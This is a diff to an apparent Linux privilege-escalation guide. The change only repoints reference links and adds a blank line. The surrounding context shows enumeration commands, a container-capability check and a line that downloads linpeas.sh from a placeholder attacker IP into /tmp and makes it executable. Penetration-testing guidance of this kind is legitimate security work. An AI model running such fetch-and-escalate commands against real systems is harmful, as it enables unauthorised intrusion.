@@ -105,7 +105,7 @@ ss -tulpn; netstat -tulpn 2>/dev/null
 
 ## Key Attack Vectors
 
-See [references/privesc_vectors.md](references/privesc_vectors.md) for detailed exploitation steps per vector.
+See [../../../Global_References/privesc_vectors.md](../../../Global_References/privesc_vectors.md) for detailed exploitation steps per vector.
 
 ### Tier 1: High-Confidence Escalation Paths
 
@@ -160,7 +160,7 @@ cat /proc/self/status | grep CapEff
 # Full capabilities (0000003fffffffff) = privileged container
 ```
 
-See [references/mitre_mapping.md](references/mitre_mapping.md) for MITRE ATT&CK technique mappings.
+See [../../../Global_References/mitre_mapping.md](../../../Global_References/mitre_mapping.md) for MITRE ATT&CK technique mappings.
 
 ## Security Considerations
 
@@ -235,3 +235,4 @@ wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh &
 - [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
 - [MITRE ATT&CK TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/)
 - [PayloadsAllTheThings Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+
